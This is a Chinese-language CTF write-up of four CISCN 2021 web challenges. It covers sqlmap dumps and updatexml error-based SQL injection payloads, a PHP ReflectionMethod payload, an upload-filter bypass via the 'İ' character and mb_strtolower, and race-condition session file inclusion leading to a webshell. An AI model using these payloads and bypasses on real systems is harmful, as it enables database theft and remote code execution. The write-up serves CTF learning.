---
title: ciscn 2021 web WP
date: 2021-05-31 10:04:23
tags:  CTF,比赛
category: CTF
---


## easy_sql

**考点：无列名和报错注入**

1. 爆表名：

```
sqlmap -u http://124.71.238.95:25075/ --data="uname=&passwd=&Submit=%E7%99%BB%E5%BD%95"  -D security -common-tables
```

![image-20210515132807394](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143910.png)

![image-20210515132817070](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143912.png)



2. 爆列名，发现只有自增id列，说明还有列名没有显示，==这时候就应该想到无列名注入了==
```
sqlmap -u http://124.71.238.95:25075/ --data="uname=&passwd=&Submit=%E7%99%BB%E5%BD%95"  -D security -T flag --columns --hex
```

![image-20210515135616512](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143913.png)



```
sqlmap -u http://124.71.238.95:25075/ --data="uname=&passwd=&Submit=%E7%99%BB%E5%BD%95"  -D security -T flag -C "id" --dump --hex
```

![image-20210515135759698](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143914.png)



3. 另一个表啥也没有

```
sqlmap -u http://124.71.238.95:25075/ --data="uname=&passwd=&Submit=%E7%99%BB%E5%BD%95"  -D security -T users --columns --hex
```

![image-20210515140045222](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143915.png)



```
sqlmap -u http://124.71.238.95:25075/ --data="uname=&passwd=&Submit=%E7%99%BB%E5%BD%95"  -D security -T users -C "id,username" --dump --hex
```

![image-20210515140322605](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143916.png)



4. 用户信息也不是管理员

```
sqlmap -u http://124.71.238.95:25075/ --data="uname=&passwd=&Submit=%E7%99%BB%E5%BD%95"  --is-dba
```

![image-20210515142804930](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143917.png)



5.无列名报错注入

```
1') and updatexml(1,concat(0x7e,(select*from (select * from flag as a join flag as b using(id,no))as c),0x7e),1)#&Submit=%E7%99%BB%E5%BD%95
```

报错出字段，继续

```
uname=admin&passwd=1')||updatexml(1,((select `cb9704e8-dfcb-4feb-90c7-d84c92ef0062` from flag limit 0,1)),1)%23#&Submit=%E7%99%BB%E5%BD%95
```







## easy_source
[原题](https://r0yanx.com/2020/10/28/fslh-writeup/)

1. 这题考察了php原生类的使用，参考ctfshow的web100使用反射类new ReflectionClass("类名")，获得这个类的信息
3. 原题，ReflectionMethod 构造 User 类中的函数方法，再通过 getDocComment 获取函数的注释
4. 考虑利用原生类ReflectionMethod读取用户类中的方法



**dirsearch使用**

[教程1](https://www.cnblogs.com/qingchengzi/articles/12652232.html)

```
-u  指定需要扫描URL
-e   指定需要扫描的文件名    例如：-e php  如果不知道即所有 -e *
-w  指定自定义的字典文件路径
排除多个响应状态码：-x 403,302,301
-r 递归扫描     非常耗时
//在扫描时要退出扫描，请从键盘解析“e”。要从停止点继续执行，请解析“c"。解析“ n”以移至下一个目录。这些步骤将使您可以控制结果，因为递归扫描是一个耗时的过程。
-R 递归深度级别
```

### 敏感文件
[**参考，secskill](https://ninjia.gitbook.io/secskill/web/info)，[语雀+漏洞案例](https://www.yuque.com/lakemoon/dctose/tpg530)、[个人博客初级+python批量扫描](https://www.imbajin.com/web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E4%B9%8B%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B(%E4%B8%80)/)


	1.	常见检测方法是通过对网站进行web漏洞扫描，直接利用爬虫来爬取网站可能存在的路径以及链接，如果存在备份文件，则可通过web直接进行下载。
	2.	也可以通过自行构造字典，对网站某一目录下，指定字典进行爆破，常见的扫描工具有wwwscan、御剑后台扫描工具等。
	3. 在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容
以 index.php 为例：第一次产生的交换文件名为 .index.php.swp
再次意外退出后，将会产生名为 .index.php.swo 的交换文件
第三次产生的交换文件则为 .index.php.swn
```
常见的备份文件格式有：
index.phps
index.php.swp
index.php.swo
index.php.php~
index.php.bak
index.php.txt
index.php.old
```







### 反射
[笔记](https://www.kancloud.cn/shaoguan/phpstudy/384102)
[****掘金，各类函数，属性用法](https://juejin.cn/post/6844904148891074568)
[简书](https://www.jianshu.com/p/d02cbde1cdd7)



> 面向对象编程中对象被赋予了自省的能力，而这个自省的过程就是反射。
反射，直观理解就是根据到达地找到出发地和来源。比如，**一个光秃秃的对象，我们可以仅仅通过这个对象就能知道它所属的类、拥有哪些方法**。
反射是指在PHP运行状态中，扩展分析PHP程序，导出或提出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取信息以及动态调用对象方法的功能称为反射API。

```
// 获取对象属性列表
$reflect = new ReflectionObject($student);
$props　= $reflect->getProperties();
foreach ($props as $prop) {
  print $prop->getName() ."\n";
}
// 获取对象方法列表
$m=$reflect->getMethods();
foreach ($m as $prop) {
  print $prop->getName() ."\n";
}
```

反射注释
```
$classComment = $refClass->getDocComment();  // 获取User类的注释文档，即定义在类之前的注释
$methodComment = $refClass->getMethod('setPassowrd')->getDocComment();  // 获取User类中setPassowrd方法的注释
//$classComment 结果如下：
/** * 用户相关类 */
//$methodComment 结果如下：
/** * 设置密码 * @param string $password */
```





### ctf 中的php反射
[参考+讲解ctfshow100](https://www.codeleading.com/article/24664981902/)

反射类不仅仅可以建立对类的映射，**也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况【ReflectionClass类并传入PHP代码时，会返回代码的运行结果】**。因此可以通过建立反射类new ReflectionClass(system(‘cmd’))来执行命令

要点：通过建立反射类`new ReflectionClass(system('cmd'))`来执行命令


### 本题
- 设法反射注释
- 平常我们用的比较多的是 ReflectionClass类 和 ReflectionMethod类
- ReflectionClass类只能传入一个参数【参数是类名】，所以我们尝试ReflectionMethod类【参数是类名+方法】
- `$method = new ReflectionMethod('Counter', 'increment');`
- 本题考察的是 PHP反射，ReflectionMethod 构造 User 类中的函数方法，再通过 getDocComment 获取函数的注释，本例中使用__toString 同样可以输出函数注释内容。

- payload:
```
?rc=ReflectionMethod&ra=User&rb=a&rd=getDocComment
```
因为不知道是在哪个函数的注释中，所以逐个函数【rb】暴破，暴破 rb 的值 a-z，可以发现 flag 在 q的注释中，回显flag


#### 更多
[__tostring](https://blog.csdn.net/wong_gilbert/article/details/76679108?utm_source=app&app_version=4.7.1)：对象被当成字符串输出时会自动触发的函数，必须得有return

[2019ciscn反射](https://museljh.github.io/2019/04/24/ctf%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/)



## easy_load
[**yu师傅](https://blog.csdn.net/miuzzx/article/details/116885083?utm_source=app&app_version=4.7.1)
【[2](https://midiya.blog.csdn.net/article/details/117044715)】

考点：
1. [php中$_FILES变量的用法及文件上传过程](https://segmentfault.com/a/1190000000591094)
2. [菜鸟教程文件上传与$_FILES用法](https://www.runoob.com/php/php-file-upload.html)
3. [MDN WEB DOCS发送表单数据](https://developer.mozilla.org/zh-CN/docs/Learn/Forms/Sending_and_retrieving_form_data)

#### 文件上传

1. 在使用表单的时候经常将表单的数据发送至php脚本做处理，然后，我们可以用表单提交的过程来**实现运行php脚本**
2. 这样点击提交按钮时就可以实现运行php脚本，action里的php文件代表你要执行的脚本
3. action表示表单数据接收方，实现对数据的各种处理
4. `$_FILES['file']['tmp_name']`是该临时文件的路径（而非名称）



index.php

```php
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="upload") {
    if ($_FILES['postedFile']['size'] > 1024*512) {
        die("这么大个的东西你是想d我吗？");
    }
    $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']);
    if ($imageinfo === FALSE) {
        die("如果不能好好传图片的话就还是不要来打扰我了");
    }
    if ($imageinfo[0] !== 1 && $imageinfo[1] !== 1) {
        die("东西不能方方正正的话就很讨厌");
    }
    $fileName=urldecode($_FILES['postedFile']['name']); //⚠️url解密了一波
    if(stristr($fileName,"c") || stristr($fileName,"i") || stristr($fileName,"h") || stristr($fileName,"ph")) {
        die("有些东西让你传上去的话那可不得了");
    }
    $imagePath = "/var/www/html/image/" . mb_strtolower($fileName);  //⚠️放
    if(move_uploaded_file($_FILES["postedFile"]["tmp_name"], $imagePath)) {
        echo "upload success, image at $imagePath";
    } else {
        die("传都没有传上去");
    }
}
```
1. getimagesize—返回图像信息【数组】,参数是路径/url，必须是图像，否则返回false
  - 返回数组信息：
> -  索引 0 给出的是图像宽度的像素值
> -  索引 1 给出的是图像高度的像素值
> -  索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM
> -  索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签
> -  索引 bits 给出的是图像的每种颜色的位数，二进制格式
> -  索引 channels 给出的是图像的通道值，RGB 图像默认是 3
> -  索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header("Content-type: image/jpeg");
> - ⚠️此时mime检测的不是数据包中的content-type，而是图片的文件头
2. stristr() 函数搜索字符串在另一字符串中的第一次出现并返回其及余下部分
3. mb_strtolower—返回小写的字符串，比strtolower支持更多字符，如unicode
4. move_uploaded_file—将上传的文件A移动的新位置B，成功返回true，失败返回false

#### 解读：

index.php内容：
参数ctf要==’upload’，大小要小于1024*512，文件得为图片，图片长宽需相等，文件名不能有c、i、h、ph，最后将文件名转小写上传到/var/www/html/image/下



example.php
```php
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="poc") {
    $zip = new \ZipArchive();
    $name_for_zip = "example/" . $_POST["file"];   //⚠️压缩文件路径
    if(explode(".",$name_for_zip)[count(explode(".",$name_for_zip))-1]!=="zip") {  //⚠️
        die("要不咱们再看看？");
    }
    if ($zip->open($name_for_zip) !== TRUE) {
        die ("都不能解压呢");
    }

    echo "可以解压，我想想存哪里";  
    $pos_for_zip = "/tmp/example/" . md5($_SERVER["REMOTE_ADDR"]);   //⚠️临时解压路径
    $zip->extractTo($pos_for_zip);   //⚠️解压后直接去解压的路径example下访问md.php命令执行就行
    $zip->close();
    unlink($name_for_zip);
    $files = glob("$pos_for_zip/*");
    foreach($files as $file){
        if (is_dir($file)) {
            continue;
        } 
        $first = imagecreatefrompng($file);   //⚠️
        $size = min(imagesx($first), imagesy($first));
        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            $final_name = pathinfo($file)["basename"];
            imagepng($second, 'example/'.$final_name);   //⚠️修剪后的图片转移至example下
            imagedestroy($second);
        }
        imagedestroy($first);
        unlink($file);
    }

}
```
[php利用ZipArchive类操作文件的实例](https://cloud.tencent.com/developer/article/1722696)
- 类前加反斜杠意思是全局搜索类
> ZipArchive类—对文件进行压缩与解压缩处理
>
> ZipArchive::extractTo,将压缩包解压到指定目录【解压】
>
> ZipArchive::open,打开一个zip压缩包【必备】【成功返回true】
>
> ZipArchive::addFile,将文件添加到指定zip压缩包中【压缩】
>
> ZipArchive::addFromString,将指定内容的文件添加到压缩包

- $_SERVER['REMOTE_ADDR']; //访问端（有可能是用户，有可能是代理的）IP【[与其他获取ip的区别](https://www.cnblogs.com/jackluo/archive/2013/03/03/2941411.html)】 
- unlink—删除文件，成功返回true【`/.`可以绕过unlink】
- [glob](https://www.w3school.com.cn/php/func_filesystem_glob.asp) — 寻找与模式匹配的文件名/目录的数组
- [简书，图像相关函数](https://www.jianshu.com/p/6600341d8754)
- imagecreatefrompng—由文件或url创建一个图像
- [imagecrop](https://vimsky.com/examples/usage/php-imagecrop-function.html)—图像裁剪函数，将图像裁剪到给定的矩形区域，然后返回生成的图像。成功时返回裁剪的图像资源，或者在失败时返回FALSE。
- imagejpeg—以 JPEG格式将图像输出到浏览器或文件
- pathinfo() 函数以数组的形式返回文件路径/文件格式的信息，第二个参数指定哪个数组元素
 ```php
Array
(
[dirname] => /testweb
[basename] => test.txt
[extension] => txt
)
 ```
#### 解读：

example内容：
ctf参数要\==’poc’，file文件最后后缀得为===zip【但是index.php里把i过滤了！】，并将其解压到`/tmp/example/用户ip` 目录下，并删除原压缩文件，对解压后的每一个文件，生成png并裁剪然后生成到example/下





#### 

#### 1. 绕mb_strwolower

其中，在3.6、7.1等版本中，mb_strtolower('İ')==='i'，mb_strtolower的小写映射时将'İ'映射到i，目前只发现该函数和如下字符存在漏洞：**使用İ字符可以绕过i字符的匹配，如果php这三个字符也能绕过就能直接上传php了**

**结合example.php的解压压缩包 我们利用zİp来替代zip（İ会被解析/认为为I，再通过mb_strtolower就变成了i）**

```php
array('c', 'C', 'g', 'G', 'i', 'I', 'o', 'O', 's', 'S', 'u', 'U');
array('ç', 'Ç', 'ğ', 'Ğ', 'ı', 'İ', 'ö', 'Ö', 'ş', 'Ş', 'ü', 'Ü');
 İ的url编码：%c4%b0
```

#### 2. 绕getimagesize：

```php
#define test_width 1
#define test_height 1
```
  **注意⚠️放在文件末尾！**	

3. 绕imagecreatefrompng

文件上传脚本
```html
<html>
<head>
    <meta charset="utf-8">
</head>
<body>
<form action="http://42ae6f34-c405-4aa4-a2c1-c20b68500d8a.node3.buuoj.cn/?ctf=upload" method="post" enctype="multipart/form-data">
    <input type="file" name="postedFile" id="id"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

![image-20210530210553526](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143919.png)

![image-20210530210538872](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143920.png)

#### 3：解压出php

![image-20210530211204373](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143921.png)

发现解压后一句话弄不了，发现是图片马二次渲染问题=》普通的图片马解决不了

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143922.png" alt="image-20210531003611751" style="zoom:50%;" />



<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143923.png" alt="image-20210531003634582" style="zoom: 67%;" />

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143924.png" alt="image-20210531003734744" style="zoom:50%;" />



成功getshell

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143925.png" alt="image-20210531003914233" style="zoom:50%;" />















#### 发现更多

[imagemagick邂逅getimagesize的那点事儿](https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html#)

[upload-labs之pass 16详细分析](https://xz.aliyun.com/t/2657#toc-3)

[【靶场】文件上传upload-labs 21关【无WAF】](https://www.jianshu.com/p/05a410f3f3e0)

[Upload-labs 1-21关 靶场通关攻略(全网最全最完整)](http://www.phpheidong.com/blog/article/36019/7fc4518d58a4c40fcb31/)   、 [2](http://myhackerworld.top/2019/01/19/upload-labs-%E5%AD%A6%E4%B9%A0/)

[wp](https://lemonprefect.cn/zh-cn/posts/7c083fa1#upload) 

[wp2**](http://wh1sper.com/ciscn-2021-quals-writeup/)





## middle_source
[csdn wp1](https://blog.csdn.net/Anton__1/article/details/116891706?utm_medium=distribute.wap_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-2.wap_blog_relevant_pic&depth_1-utm_source=distribute.wap_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-2.wap_blog_relevant_pic)
[csdn wp2](https://blog.csdn.net/m0_51078229/article/details/116845451)

考点：任意文件包含、PHP_SESSION_UPLOAD_PROGRESS➕条件竞争进行文件包含

利用对 文件上传时PHP_SESSION_UPLOAD_PROGRESS自动生成的临时session文件【代码注入】 条件竞争实现session里代码的执行

【[【5**】先知社区浅谈 SESSION_UPLOAD_PROGRESS 的利用+session](https://xz.aliyun.com/t/9545#toc-8)】

### 条件竞争
[csdn+ctf小例子](https://blog.csdn.net/qq_36992198/article/details/80007405?utm_source=app&app_version=4.7.1)

1. Web服务器处理多用户请求时，是并发进行的，如果并发处理不当或者是相关的逻辑操作设计的不合理时，就可能导致条件竞争漏洞。
- 一个简单的例子：
  将文件上传到服务器，然后检查上传的文件的类型，如果不符合条件就删除。

2. 但是，如果我们采用**多线程的方式访问上传的文件，总有一次我们在文件删除之前就访问到了这个文件**，如果这个文件是php的一句话木马，就在服务器中执行，即getshell
3. 注意⚠️上传的文件被杀软查杀了，是**上传成功才被查杀的**=》考虑利用条件竞争漏洞

#### ctf python脚本不断访问：
```
import requests
url = '你的文件路径'
while 1:
    r = requests.get(url)
    if 'flag' in  r.text:
        print r.text
```





### session.upload_progress
[【**3】利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含](https://www.cnblogs.com/NPFS/p/13795170.html)

[通过条件竞争进行文件上传](https://cloud.tencent.com/developer/article/1650655)

- 前提是我们需要生成一个session文件，并且知道session文件的存放位置
- 只要在上传文件的时候，同时POST一个恶意的字段 PHP_SESSION_UPLOAD_PROGRESS，目标服务器的PHP就会自动启用Session，Session文件将会自动创建。
1.  **利用session.upload_progress后的value【可控】（木马）自动被写入session文件的特性**，然后我们去包含这个session文件。
3. **session.use_strict_mode默认值为off，此时用户是可以自己定义Session ID的**。比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值
  - 注：在Linux系统中，session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session
5. 但是**session.upload_progress.cleanup默认是开启的**
  - 意思是一旦读取了所有POST数据，它就会清除进度信息【文件上传结束后session会消失】
  - 可以通过条件竞争来保持session从而实现文件上传


#### 总结：
其原理大致就是通过 PHP_SESSION_UPLOAD_PROGRESS 在目标主机上创建一个含有恶意代码【恶意代码在 PHP_SESSION_UPLOAD_PROGRESS的**value里**】的Session文件，之后利用文件包含漏洞去包含这个我们已经传入恶意代码的这个Session文件就可以达到攻击效果。
1. 上传文件时抓包➕方便认的cookie【这样服务器会生成对应名称的session文件】➕在PHP_SESSION_UPLOAD_PROGRESS下value后**添加一句话木马**
2. 然后发送到Intruder请求载荷 Null payloads 不断发包，维持session，传入恶意会话。
3. 对上述的session文件也不断访问发包
4. 这样，一边不断发包以维持恶意session存储，另一边不断发包请求包含恶意的session。**一个POST一个GET**，发现包含利用1上传的文件成功【或者加的一句话/任意命令成功执行】

